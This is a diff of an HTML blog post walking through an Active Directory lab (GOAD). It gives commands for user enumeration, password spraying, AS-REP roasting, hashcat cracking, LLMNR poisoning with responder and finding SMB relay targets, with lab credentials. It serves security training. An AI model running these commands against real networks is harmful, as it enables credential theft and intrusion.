@@ -13,8 +13,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>GOAD Part 1: AD Recon, NTLM relay, ASREPRoasting & Kerberoasting &middot; Trevor Saudi</title>
-    <meta name="title" content="GOAD Part 1: AD Recon, NTLM relay, ASREPRoasting & Kerberoasting &middot; Trevor Saudi" />
+  <title>GOAD Part 1: AD Recon, NTLM relay, Password Spraying & ASREPRoasting  &middot; Trevor Saudi</title>
+    <meta name="title" content="GOAD Part 1: AD Recon, NTLM relay, Password Spraying & ASREPRoasting  &middot; Trevor Saudi" />
   
   <meta name="description" content="Portfolio/blog" />
   
@@ -69,16 +69,16 @@
   
   
   
-  <meta property="og:title" content="GOAD Part 1: AD Recon, NTLM relay, ASREPRoasting &amp; Kerberoasting" />
-<meta property="og:description" content="Introduction # Game of Active Directory is a fully functional AD lab environment, misconfigured with several AD bug types designed to help understand various AD security concepts." />
+  <meta property="og:title" content="GOAD Part 1: AD Recon, NTLM relay, Password Spraying &amp; ASREPRoasting " />
+<meta property="og:description" content="Introduction # Game of Active Directory is a fully functional AD lab environment, misconfigured with several AD issues designed to help understand various AD security concepts." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://localhost:1313/posts/2024-06-21_red_team07/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2024-06-11T00:00:00+00:00" />
 <meta property="article:modified_time" content="2024-06-11T00:00:00+00:00" /><meta property="og:site_name" content="Trevor Saudi" />
 
   <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="GOAD Part 1: AD Recon, NTLM relay, ASREPRoasting &amp; Kerberoasting"/>
-<meta name="twitter:description" content="Introduction # Game of Active Directory is a fully functional AD lab environment, misconfigured with several AD bug types designed to help understand various AD security concepts."/>
+<meta name="twitter:title" content="GOAD Part 1: AD Recon, NTLM relay, Password Spraying &amp; ASREPRoasting "/>
+<meta name="twitter:description" content="Introduction # Game of Active Directory is a fully functional AD lab environment, misconfigured with several AD issues designed to help understand various AD security concepts."/>
 
   
   <script type="application/ld+json">
@@ -86,10 +86,10 @@
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Posts",
-    "name": "GOAD Part 1: AD Recon, NTLM relay, ASREPRoasting \u0026 Kerberoasting",
-    "headline": "GOAD Part 1: AD Recon, NTLM relay, ASREPRoasting \u0026 Kerberoasting",
+    "name": "GOAD Part 1: AD Recon, NTLM relay, Password Spraying \u0026 ASREPRoasting ",
+    "headline": "GOAD Part 1: AD Recon, NTLM relay, Password Spraying \u0026 ASREPRoasting ",
     
-    "abstract": "Introduction # Game of Active Directory is a fully functional AD lab environment, misconfigured with several AD bug types designed to help understand various AD security concepts.",
+    "abstract": "Introduction # Game of Active Directory is a fully functional AD lab environment, misconfigured with several AD issues designed to help understand various AD security concepts.",
     "inLanguage": "en",
     "url" : "http:\/\/localhost:1313\/posts\/2024-06-21_red_team07\/",
     "author" : {
@@ -105,7 +105,7 @@
     "keywords": ["Active Directory","Pentesting"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "674"
+    "wordCount": "1151"
   }]
   </script>
 
@@ -262,7 +262,7 @@
     <a
       class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
       href="/posts/2024-06-21_red_team07/"
-      >GOAD Part 1: AD Recon, NTLM relay, ASREPRoasting &amp; Kerberoasting</a
+      >GOAD Part 1: AD Recon, NTLM relay, Password Spraying &amp; ASREPRoasting </a
     ><span class="px-1 text-primary-500">/</span>
   </li>
 
@@ -271,7 +271,7 @@
 
       
       <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-        GOAD Part 1: AD Recon, NTLM relay, ASREPRoasting & Kerberoasting
+        GOAD Part 1: AD Recon, NTLM relay, Password Spraying & ASREPRoasting 
       </h1>
       <div class="mt-8 mb-12 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
         
@@ -306,7 +306,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2024-06-11 00:00:00 &#43;0000 UTC">11 June 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
+      <time datetime="2024-06-11 00:00:00 &#43;0000 UTC">11 June 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">6 mins</span>
     
 
     
@@ -336,20 +336,36 @@
   <ul>
     <li><a href="#introduction">Introduction</a></li>
     <li><a href="#network-diagram">Network Diagram</a></li>
-    <li><a href="#reconnaissance">Reconnaissance</a>
+    <li><a href="#reconnaissance-and-enumeration">Reconnaissance and Enumeration</a>
       <ul>
         <li><a href="#hosts-file-setup">Hosts file setup</a></li>
+        <li><a href="#domain-user-enumeration">Domain User enumeration</a></li>
+        <li><a href="#domain-group-enumeration">Domain Group enumeration</a></li>
       </ul>
     </li>
-    <li><a href="#domain-user-enumeration">Domain User enumeration</a></li>
-    <li><a href="#domain-group-enumeration">Domain Group enumeration</a></li>
-    <li><a href="#poisoning">Poisoning</a>
+    <li><a href="#valid-usernames">Valid Usernames</a>
       <ul>
-        <li><a href="#1-we-listen-in-the-interface-were-connected-in-the-subnet">1. We listen in the interface we&rsquo;re connected in the subnet</a></li>
-        <li><a href="#2-crack-with-hashcat">2. Crack with hashcat</a></li>
+        <li><a href="#password-spraying">Password Spraying</a></li>
+        <li><a href="#as-reproasting">AS-REPRoasting</a></li>
       </ul>
     </li>
-    <li><a href="#password-spraying">Password spraying</a></li>
+    <li><a href="#no-valid-credentialsusernames">No Valid Credentials/Usernames</a>
+      <ul>
+        <li><a href="#llmnr-poisoning">LLMNR Poisoning</a>
+          <ul>
+            <li><a href="#1-listen-and-capture-hashes">1. Listen and capture hashes</a></li>
+            <li><a href="#2-crack-with-hashcat">2. Crack with hashcat</a></li>
+            <li><a href="#3-find-targets-for-relaying">3. Find targets for relaying</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#appendix">Appendix</a>
+      <ul>
+        <li><a href="#valid-credentials">Valid Credentials</a></li>
+        <li><a href="#valid-users">Valid Users</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
   </div>
@@ -403,15 +419,15 @@
 </p>
 <h2 id="introduction" class="relative group">Introduction <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#introduction" aria-label="Anchor">#</a></span></h2>
 <ul>
-<li>Game of Active Directory is a fully functional AD lab environment, misconfigured with several AD bug types designed to help understand various AD security concepts. I recently deployed it on a Windows host and have been playing with it.</li>
-<li>In this n-part series, we will explore the various AD misconfigurations and how we can abuse them while maintaining our OPSEC. Part 1 will focus on how we go about with enumeration of the environment to map out the various open services and ports and discover of users in the network. The recon process is the most crucial part as it makes the rest of our attack paths clearer and straightforward.</li>
-<li>We will proceed with looking at some misconfigurations we can exploit when we don&rsquo;t have credentials in an AD environment such as NTLM relay and ASREPRoasting then finish of with kerberoasting.</li>
+<li><a href="https://github.com/Orange-Cyberdefense/GOAD" target="_blank">Game of Active Directory</a> is a fully functional AD lab environment, misconfigured with several AD issues designed to help understand various AD security concepts.</li>
+<li>In this n-part series, we will explore how we can abuse the misconfigurations .In part 1, we focus on <code>enumerating</code> the environment to find <code>domains, domain controllers, usernames and groups</code>. We further leverage this to conduct various attacks, showcasing techniques like <code>password spraying &amp; ASREPRoasting</code>.</li>
+<li>We then finish off by exploring what attacks can be carried out when we have <code>no credentials or usernames</code> to work with such as the <code>LLMNR Poisoning and NTLM relay</code>.</li>
 </ul>
 <h2 id="network-diagram" class="relative group">Network Diagram <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#network-diagram" aria-label="Anchor">#</a></span></h2>
 <div style="width: 930px;">
         <img src="/posts/2024-06-11_red_team06/images/GOAD_schema.png" alt="no image" />
 </div>
-<h2 id="reconnaissance" class="relative group">Reconnaissance <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#reconnaissance" aria-label="Anchor">#</a></span></h2>
+<h2 id="reconnaissance-and-enumeration" class="relative group">Reconnaissance and Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#reconnaissance-and-enumeration" aria-label="Anchor">#</a></span></h2>
 <ul>
 <li>From our network diagram, we are dealing with 5 different machines across 3 domains in the network.</li>
 </ul>
@@ -435,11 +451,11 @@
 </li>
 </ol>
 <ul>
-<li>The creators of GOAD - Orange Cyberdefense - have also come up with this mindmap that structures our AD pentesting approach. We will frequently refer to this resource throughout these writeups</li>
+<li>The creators of GOAD - Orange Cyberdefense - have also come up with <a href="https://orange-cyberdefense.github.io/ocd-mindmaps/" target="_blank">this</a> mindmap that structures our AD pentesting approach. We will frequently refer to this resource when exploring the lab</li>
 </ul>
 <h3 id="hosts-file-setup" class="relative group">Hosts file setup <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#hosts-file-setup" aria-label="Anchor">#</a></span></h3>
 <ul>
-<li>We can begin by mapping out all the machines in our hosts file. Using the IP information and domains given to us, we can then find the <code>domain controllers</code> in the network.</li>
+<li>We can begin by mapping out all the machines in our hosts file. Using the IP information and domains given to us, we can find the <code>domain controllers</code> in the network.</li>
 </ul>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nslookup -type<span class="o">=</span>SRV _ldap._tcp.dc._msdcs.north.sevenkingdoms.local 192.168.56.11
 </span></span><span class="line"><span class="cl">Server:         192.168.56.11
@@ -464,20 +480,70 @@
 </span></span><span class="line"><span class="cl">192.168.56.12   essos.local meereen.essos.local meereen
 </span></span><span class="line"><span class="cl">192.168.56.22   castelblack.north.sevenkingdoms.local castelblack
 </span></span><span class="line"><span class="cl">192.168.56.23   braavos.essos.local braavos
-</span></span></code></pre></div><h2 id="domain-user-enumeration" class="relative group">Domain User enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#domain-user-enumeration" aria-label="Anchor">#</a></span></h2>
+</span></span></code></pre></div><h3 id="domain-user-enumeration" class="relative group">Domain User enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#domain-user-enumeration" aria-label="Anchor">#</a></span></h3>
 <ul>
-<li>We have several options for this. We can use <code>crackmapexec or enum4linux</code> to check for this information.</li>
+<li>We have several options for this. We will use <code>crackmapexec and enum4linux</code> to check for this information.</li>
 </ul>
 <div >
         <img src="/posts/2024-06-21_red_team07/images/find-user-list.png" alt="no image" />
 </div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="n">ips</span><span class="p">.</span><span class="py">txt</span> <span class="p">-</span><span class="n">-users</span> 
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">192.168</span><span class="p">.</span><span class="py">56</span><span class="p">.</span><span class="mf">10</span><span class="p">-</span><span class="mf">23</span> <span class="p">-</span><span class="n">-users</span> 
 </span></span></code></pre></div><div >
         <img src="/posts/2024-06-21_red_team07/images/users-enum.png" alt="no image" />
 </div>
 <ul>
-<li>We get some domain users and credentials in a user&rsquo;s description.</li>
+<li>We get some domain users from the north domain and credentials in a user&rsquo;s description.</li>
 </ul>
+<table>
+<thead>
+<tr>
+<th>Hostname</th>
+<th>Username</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WINTERFELL</td>
+<td>north.sevenkingdoms.local\Guest</td>
+</tr>
+<tr>
+<td>WINTERFELL</td>
+<td>north.sevenkingdoms.local\arya.stark</td>
+</tr>
+<tr>
+<td>WINTERFELL</td>
+<td>north.sevenkingdoms.local\sansa.stark</td>
+</tr>
+<tr>
+<td>WINTERFELL</td>
+<td>north.sevenkingdoms.local\brandon.stark</td>
+</tr>
+<tr>
+<td>WINTERFELL</td>
+<td>north.sevenkingdoms.local\rickon.stark</td>
+</tr>
+<tr>
+<td>WINTERFELL</td>
+<td>north.sevenkingdoms.local\hodor</td>
+</tr>
+<tr>
+<td>WINTERFELL</td>
+<td>north.sevenkingdoms.local\jon.snow</td>
+</tr>
+<tr>
+<td>WINTERFELL</td>
+<td>north.sevenkingdoms.local\samwell.tarly</td>
+</tr>
+<tr>
+<td>WINTERFELL</td>
+<td>north.sevenkingdoms.local\jeor.mormont</td>
+</tr>
+<tr>
+<td>WINTERFELL</td>
+<td>north.sevenkingdoms.local\sql_svc</td>
+</tr>
+</tbody>
+</table>
 <div class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900">
   <span class="ltr:pr-3 rtl:pl-3 text-primary-400">
     
@@ -492,6 +558,7 @@
   <span class="dark:text-neutral-300">samwell.tarly : Heartsbane</span>
 </div>
 
+<br>
 <ul>
 <li>Recon is a recursive process. Upon getting valid credentials, you should rerun your user enumeration commands with credentials to see whether you get more information</li>
 </ul>
@@ -499,17 +566,19 @@
         <img src="/posts/2024-06-21_red_team07/images/users-enum2.png" alt="no image" />
 </div>
 <ul>
-<li>We get more users on the domain</li>
-</ul>
-<h2 id="domain-group-enumeration" class="relative group">Domain Group enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#domain-group-enumeration" aria-label="Anchor">#</a></span></h2>
-<ul>
-<li>I ran crackmapexec without creds but we don&rsquo;t get an output on any domain</li>
+<li>We get more users on the domain.</li>
 </ul>
 <div>
-        <img src="/posts/2024-06-21_red_team07/images/crackmapexec-groups.png" alt="no image" />
+        <img src="/posts/2024-06-21_red_team07/images/users-enum2.png" alt="no image" />
 </div>
+<h3 id="domain-group-enumeration" class="relative group">Domain Group enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#domain-group-enumeration" aria-label="Anchor">#</a></span></h3>
 <ul>
-<li>We can run either <code>crackmapexec</code> or <code>enum4linux</code> with  samwell&rsquo;s creds and extract some domain group information. We are only able to retrieve information on the <code>north.sevenkingdoms.local</code> domain.</li>
+<li>
+<p>I ran crackmapexec without creds but did don&rsquo;t get an output on any domain</p>
+</li>
+<li>
+<p>We can run either <code>crackmapexec</code> or <code>enum4linux</code> with  samwell&rsquo;s creds and extract some domain group information. We will only able to retrieve information on the <code>north</code> domain.</p>
+</li>
 </ul>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">enum4linux -a -U 192.168.56.11  -u samwell.tarly -p Heartsbane
 </span></span></code></pre></div><div>
@@ -564,15 +633,112 @@
 </tr>
 </tbody>
 </table>
-<h2 id="poisoning" class="relative group">Poisoning <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#poisoning" aria-label="Anchor">#</a></span></h2>
+<h2 id="valid-usernames" class="relative group">Valid Usernames <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#valid-usernames" aria-label="Anchor">#</a></span></h2>
+<ul>
+<li>With valid usernames for the <code>north</code> domain, we can attempt a <code>password spray</code> to hunt for <code>valid credentials</code> or perform an <code>ASREPRoast</code> using the valid credentials we obtained</li>
+</ul>
+<div>
+        <img src="/posts/2024-06-21_red_team07/images/username-nocreds.png" alt="no image" />
+</div>
+<h3 id="password-spraying" class="relative group">Password Spraying <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#password-spraying" aria-label="Anchor">#</a></span></h3>
+<ul>
+<li>
+<p>In this attack, we aim to identify valid user credentials by attempting few <code>commonly used passwords</code>. In organizations with a fairly high number of users, there&rsquo;s a chance that some are using weak passwords.</p>
+</li>
+<li>
+<p>This attack contrasts with a standard brute-force that involves attempting many passwords against a single account which we cannot launch against this environment due to the account lockout policy shown below.</p>
+</li>
+<li>
+<p><code>enum4linux</code> scan results:</p>
+</li>
+</ul>
+<div>
+        <img src="/posts/2024-06-21_red_team07/images/password-info.png" alt="no image" />
+</div>
+<ul>
+<li>We can use <code>crackmapexec's --no-bruteforce</code> parameter to achieve the password spray. I created a list of the user accounts and proceeded to use that list for the password list as well.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">192.168.56.11</span> <span class="o">-</span><span class="n">u</span> <span class="n">actualusers</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">p</span> <span class="n">actualusers</span><span class="p">.</span><span class="n">txt</span> <span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">bruteforce</span>
+</span></span></code></pre></div><div>
+        <img src="/posts/2024-06-21_red_team07/images/hodor.png" alt="no image" />
+</div>
+<ul>
+<li>We get <code>hodor's</code> credentials</li>
+</ul>
+<div class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900">
+  <span class="ltr:pr-3 rtl:pl-3 text-primary-400">
+    
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 0C114.6 0 0 114.6 0 256s114.6 256 256 256s256-114.6 256-256S397.4 0 256 0zM256 128c17.67 0 32 14.33 32 32c0 17.67-14.33 32-32 32S224 177.7 224 160C224 142.3 238.3 128 256 128zM296 384h-80C202.8 384 192 373.3 192 360s10.75-24 24-24h16v-64H224c-13.25 0-24-10.75-24-24S210.8 224 224 224h32c13.25 0 24 10.75 24 24v88h16c13.25 0 24 10.75 24 24S309.3 384 296 384z"/></svg>
+
+  </span>
+
+
+  </span>
+  <span class="dark:text-neutral-300">hodor : hodor</span>
+</div>
+
+<h3 id="as-reproasting" class="relative group">AS-REPRoasting <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#as-reproasting" aria-label="Anchor">#</a></span></h3>
+<ul>
+<li>The authentication process for kerberos can be split into the following parts.</li>
+</ul>
+<div>
+        <img src="/posts/2024-06-21_red_team07/images/asrep.jpg" alt="no image" />
+</div>
+<ul>
+<li>
+<p><code>AS-REPRoasting</code> allows attackers to extract Ticket Granting Tickets (TGT) for accounts that don&rsquo;t have Kerberos <code>pre-authentication</code> enabled. Attackers can request an Authentication Service Response (AS-REP) from the KDC without knowing the user&rsquo;s password. This response contains credential material that can be cracked offline.</p>
+</li>
+<li>
+<p><code>Pre-authentication</code> ensures users send encrypted requests to the KDC when authenticating to services. When disabled, users send plain text requests and receive an encrypted AS-REP, making them vulnerable to offline cracking.</p>
+</li>
+<li>
+<p>We need valid user credentials (low privileged accounts work) to identify the target accounts. Using <code>samwell.tarly's</code> creds and <code>impacket-GetNPUsers</code>, we can enumerate the users</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">impacket-GetNPUsers</span> <span class="n">north</span><span class="p">.</span><span class="py">sevenkingdoms</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">samwell</span><span class="p">.</span><span class="n">tarly</span><span class="err">:</span><span class="n">Heartsbane</span> <span class="n">-request</span>
+</span></span></code></pre></div><div>
+        <img src="/posts/2024-06-21_red_team07/images/as-rep.png" alt="no image" />
+</div>
+<ul>
+<li>Proceed to crack the credentials with hashcat.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">hashcat</span> <span class="n">-m</span> <span class="mf">18200</span> <span class="n">-a</span> <span class="mf">0</span> <span class="n">brandon</span><span class="p">.</span><span class="py">hash</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="py">txt</span><span class="p">.</span><span class="py">gz</span> 
+</span></span></code></pre></div><div>
+        <img src="/posts/2024-06-21_red_team07/images/cracked.png" alt="no image" />
+</div>
+<div class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900">
+  <span class="ltr:pr-3 rtl:pl-3 text-primary-400">
+    
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 0C114.6 0 0 114.6 0 256s114.6 256 256 256s256-114.6 256-256S397.4 0 256 0zM256 128c17.67 0 32 14.33 32 32c0 17.67-14.33 32-32 32S224 177.7 224 160C224 142.3 238.3 128 256 128zM296 384h-80C202.8 384 192 373.3 192 360s10.75-24 24-24h16v-64H224c-13.25 0-24-10.75-24-24S210.8 224 224 224h32c13.25 0 24 10.75 24 24v88h16c13.25 0 24 10.75 24 24S309.3 384 296 384z"/></svg>
+
+  </span>
+
+
+  </span>
+  <span class="dark:text-neutral-300">brandon.stark : iseedeadpeople</span>
+</div>
+
+<h2 id="no-valid-credentialsusernames" class="relative group">No Valid Credentials/Usernames <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#no-valid-credentialsusernames" aria-label="Anchor">#</a></span></h2>
+<ul>
+<li>Lastly we will look at LLMNR Poisoning. In the event that you do not find any valid credentials or usernames, this is an essential step to take.</li>
+</ul>
+<h3 id="llmnr-poisoning" class="relative group">LLMNR Poisoning <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#llmnr-poisoning" aria-label="Anchor">#</a></span></h3>
 <div>
         <img src="/posts/2024-06-21_red_team07/images/poisoning.png" alt="no image" />
 </div>
 <ul>
-<li>LLMNR (Link-Local Multicast Resolution), is a protocol in Windows used to resolve NetBIOS names of computers on the same subnet when DNS resolution fails. When attempting to locate unknown resources in a network, LLMNR multicasts requests across a network to attempt to find unknown routes e.g shares.</li>
-<li>Attackers can trick devices to sending sensitive information by pretending to be the resource that another computer is trying to locate.</li>
+<li>
+<p>LLMNR (Link-Local Multicast Resolution), is a protocol in Windows used to resolve NetBIOS names of computers on the same subnet when DNS resolution fails. When attempting to locate unknown resources in a network, LLMNR multicasts requests across a network to attempt to find unknown routes e.g shares.</p>
+</li>
+<li>
+<p>Attackers can trick devices to sending sensitive information by pretending to be the resource that another computer is trying to locate.</p>
+</li>
 </ul>
-<h3 id="1-we-listen-in-the-interface-were-connected-in-the-subnet" class="relative group">1. We listen in the interface we&rsquo;re connected in the subnet <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#1-we-listen-in-the-interface-were-connected-in-the-subnet" aria-label="Anchor">#</a></span></h3>
+<h4 id="1-listen-and-capture-hashes" class="relative group">1. Listen and capture hashes <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#1-listen-and-capture-hashes" aria-label="Anchor">#</a></span></h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">responder</span> <span class="n">-I</span> <span class="n">eth1</span>
 </span></span></code></pre></div><ul>
 <li>We eventually harvest 2 user&rsquo;s credentials in the network</li>
@@ -583,8 +749,8 @@
 <div>
         <img src="/posts/2024-06-21_red_team07/images/eddard.stark.png" alt="no image" />
 </div>
-<h3 id="2-crack-with-hashcat" class="relative group">2. Crack with hashcat <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#2-crack-with-hashcat" aria-label="Anchor">#</a></span></h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat -m <span class="m">5600</span> -a <span class="m">0</span> ntlm.txt /usr/share/wordlists/rockyou.txt.gz 
+<h4 id="2-crack-with-hashcat" class="relative group">2. Crack with hashcat <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#2-crack-with-hashcat" aria-label="Anchor">#</a></span></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">hashcat</span> <span class="n">-m</span> <span class="mf">5600</span> <span class="n">-a</span> <span class="mf">0</span> <span class="n">ntlm</span><span class="p">.</span><span class="py">txt</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="py">txt</span><span class="p">.</span><span class="py">gz</span> 
 </span></span></code></pre></div><ul>
 <li>We get <code>robb.stark's</code> hash.</li>
 </ul>
@@ -605,10 +771,124 @@
 <ul>
 <li><code>edd's</code> hash could not be cracked but, we can relay the hashes to machines where <code>SMB signing</code> is disabled. SMB signing prevents relay attacks by appending a digital signature on packets for integrity checks.</li>
 </ul>
-<h2 id="password-spraying" class="relative group">Password spraying <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#password-spraying" aria-label="Anchor">#</a></span></h2>
+<h4 id="3-find-targets-for-relaying" class="relative group">3. Find targets for relaying <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#3-find-targets-for-relaying" aria-label="Anchor">#</a></span></h4>
 <ul>
-<li>Now that we have some information to work with, we can start out with some simple attacks such as password spra</li>
+<li>We can use crackmapexec to find the target where SMB signing has been disabled.</li>
 </ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">192.168</span><span class="p">.</span><span class="py">56</span><span class="p">.</span><span class="mf">10</span><span class="p">-</span><span class="mf">23</span> <span class="p">-</span><span class="n">-gen-relay-list</span> <span class="nb">relay-targets</span><span class="p">.</span><span class="py">txt</span>
+</span></span></code></pre></div><div>
+        <img src="/posts/2024-06-21_red_team07/images/relay-list.png" alt="no image" />
+</div>
+<ul>
+<li>
+<p>Castleback and Braavos domain controllers are vulnerable. For the attack to work, the user whose hashes being relayed has to be a local admin on the target.</p>
+</li>
+<li>
+<p>Disable SMB and HTTP Servers on responder to allow ntlmrelayx to relay the hashes instead of authenticating to itself. In Kali, the path is in the following folder</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">vi</span> <span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">responder</span><span class="p">/</span><span class="n">Responder</span><span class="p">.</span><span class="py">conf</span>
+</span></span></code></pre></div><div>
+        <img src="/posts/2024-06-21_red_team07/images/responder-options.png" alt="no image" />
+</div>
+<ul>
+<li>Start ntlmrelayx</li>
+</ul>
